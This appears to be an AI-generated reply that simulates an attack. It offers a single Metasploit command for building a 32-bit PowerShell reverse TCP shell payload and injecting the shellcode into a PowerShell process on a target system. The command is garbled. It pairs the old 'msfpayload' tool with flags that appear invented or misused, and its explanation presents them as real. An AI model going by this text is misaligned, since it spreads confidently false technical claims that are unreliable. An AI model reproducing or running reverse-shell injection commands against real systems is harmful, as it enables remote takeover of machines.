Based on the documentation and the requirement to simulate the attack behavior, I will generate realistic command lines using only the Metasploit tool.

The given information suggests that we are simulating a remote shell injection into an existing 32-bit PowerShell process or injecting shellcode into a newly created 32-bit PowerShell process. The goal is to inject Metaspilot downloader shellcode into the target system.

Here's the command line:
```
Command: `msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c "encode_final_payload" -o remove_comspec -p <shellcode>`
```

In this command, we're using the Metasploit payload to create a reverse TCP shell. We specify that we want it in PowerShell format (`-f powershell`), and we set the architecture to 32 bits (`-X 32`). The `encode_final_payload` option will Base64 encode our shellcode, and the `remove_comspec` option removes the `cmd.exe` wrapper.

We can then use this command line to inject the shellcode into a target system.
